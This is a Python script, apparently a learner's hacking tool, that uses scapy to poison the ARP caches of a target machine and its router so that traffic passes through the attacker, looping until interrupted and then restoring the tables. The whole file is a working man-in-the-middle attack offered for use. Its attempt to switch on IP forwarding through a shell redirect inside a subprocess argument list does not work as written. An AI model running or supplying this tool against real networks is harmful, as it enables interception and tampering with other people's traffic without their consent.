import scapy.all as scapy
import time
import subprocess
import optparse
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(40)
#target_ip is the pc we attack and spoof_ip is the router beware!!!
def get_arg():
    parser = optparse.OptionParser()
    parser.add_option("--t","--target", dest = "target_ip",help = "Type your target ip")
    parser.add_option("--s","--spoof", dest = "spoof_ip",help = "Type your spoof ip")
    (options,arguments) =  parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an target ip, type --help for more info ")
    if not options.spoof_ip:
        parser.error("[-] Please specify an spoof ip, type --help for more info ")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast , timeout = 2, verbose = False,retry = 3)[0]
    return answered_list[0][1].hwsrc
    
        

def spoof(target_ip, spoof_ip,target_mac):
    
    packet = scapy.ARP(op = 2 , pdst = target_ip , hwdst = target_mac , psrc = spoof_ip )
    scapy.send(packet , verbose = False)
def restore(destination_ip , source_ip ):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2 , pdst = destination_ip , hwdst = destination_mac , psrc = source_ip , hwsrc = source_mac)
    scapy.send(packet , count = 4 , verbose = False)
 
subprocess.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])   
option = get_arg()
if option != None:
   t_mac = get_mac(option.target_ip)
   s_mac = get_mac(option.spoof_ip)

   sent_packets_count = 0
   try:
       while True:
           spoof(option.target_ip , option.spoof_ip , t_mac)
           spoof(option.spoof_ip , option.target_ip , s_mac)
           sent_packets_count = sent_packets_count + 2
           time.sleep(2)
           print("\r[+] Packets sent:" + str(sent_packets_count),end="\r",flush = True)
        
   except KeyboardInterrupt:
       print("\n")
       subprocess.call(["echo","0",">","/proc/sys/net/ipv4/ip_forward"])
       print("[-] Ctrl+C Detected ....Resetting ARP tables.... Quitting...")
       restore(option.target_ip,option.spoof_ip)
       restore(option.spoof_ip,option.target_ip)
                                                  
